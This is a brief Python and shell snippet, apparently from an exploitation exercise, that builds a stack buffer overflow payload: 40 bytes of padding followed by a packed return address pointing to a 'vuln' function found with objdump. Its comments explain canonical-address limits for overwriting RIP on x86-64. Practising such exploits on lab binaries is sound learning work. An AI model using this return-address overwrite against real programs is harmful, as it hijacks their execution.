#!/usr/bin/python

print ("A"*40, end="")
# Overflow the RIP, we cannot write A*8
# but we can write 0x0000414141414141 as this is still
# canonical address within 0x00007FFFFFFFFFFF
## print ("\x41\x41\x41\x41\x41\x41\x00\x00")
## objdump -d ./binary |grep vuln
## 0000000000400686
# print ("\x86\x06\x40\x00\x00\x00\x00\x00\x00"+ "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n")


python -u -c 'import struct; import sys; sys.stdout.buffer.write  (b"A"*40);sys.stdout.buffer.write (struct.pack("<Q",0x400686))' >a
r
